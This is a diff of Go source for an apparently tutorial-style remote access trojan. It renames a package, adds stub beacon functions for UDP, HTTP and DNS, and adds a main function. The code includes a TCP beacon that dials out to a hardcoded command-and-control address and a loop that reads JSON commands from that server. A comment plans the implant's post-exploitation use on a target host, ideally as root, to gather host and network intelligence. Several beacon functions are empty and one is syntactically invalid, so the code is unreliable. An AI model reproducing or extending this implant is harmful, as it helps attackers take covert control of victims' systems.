@@ -17,19 +17,29 @@ import (
 
 
 	/*/
-	"go_rat/pkg/go_rat"
+	"go_rat/pkg/rat_shared_code"
 	"net"
 	"strings"
 )
 
 // Beacon
 // makes requests outside the network to get to the C&C
-// ONLY used for reaching out
-func Bacon() {
-	go_rat.PHONEHOME_TCP.IP = net.IP(go_rat.Remote_tcpaddr)
-	net.DialTCP("tcp", &go_rat.Local_tcpaddr_LAN, &go_rat.PHONEHOME_TCP)
+// ONLY used for reaching out with TCP
+func BaconTCP() {
+	rat_shared_code.PHONEHOME_TCP.IP = net.IP(rat_shared_code.Remote_tcpaddr)
+	net.DialTCP("tcp", &rat_shared_code.Local_tcpaddr_LAN, &rat_shared_code.PHONEHOME_TCP)
 }
 
+// Same for UDP
+func BeaconUDP() {
+
+}
+func BeaconHTTP() {
+
+}
+BeaconDNS(){
+
+}
 /*
 function to hash a string to compare against the hardcoded password
  never hardcode a password in plaintext
@@ -38,7 +48,7 @@ function to hash a string to compare against the hardcoded password
  For the porpoises of this tutorial, we use a weak password.
 */
 
-var new_command_for_q go_rat.Command
+var new_command_for_q rat_shared_code.Command
 
 // function to provide outbound connections via threading
 //-----------------Local IP---------Remote IP---------PORT-------
@@ -51,7 +61,7 @@ func Tcp_outbound(laddr net.TCPAddr, raddr net.TCPAddr, port int8) {
 	// if error isnt empty/null/nothingness
 	if err != nil {
 		// print the error
-		go_rat.Error_printer(err, "[-] Error: TCP Connection Failed")
+		rat_shared_code.Error_printer(err, "[-] Error: TCP Connection Failed")
 		return
 	}
 	// if there was no error, continue to the control loop
@@ -65,7 +75,7 @@ func Tcp_outbound(laddr net.TCPAddr, raddr net.TCPAddr, port int8) {
 			fmt.Println(error)
 			return
 		}
-		go_rat.Json_extract(netData, new_command_for_q)
+		rat_shared_code.Json_extract(netData, new_command_for_q)
 		// stops server if "STOP" Command is sent
 		// TODO: JSONIFY THIS
 		if strings.TrimSpace(string(netData)) == "STOP" {
@@ -91,4 +101,16 @@ func Tcp_network_io() {
 	//	return
 	//}
 
+}
+
+// once placed on the target host and executed post exploitation, prefferably with root
+/// level permissions, We need to:
+//	- send a beacon with a conditional dependant on environment
+// 	- run the input/output operations if that environment is right
+//  - enumerate host intel, either passively or aggressively
+//  - enumerate network information
+//  - enumerate further vulnerabilities
+//
+func main() {
+	rat_shared_code.GetTCPConnections()
 }
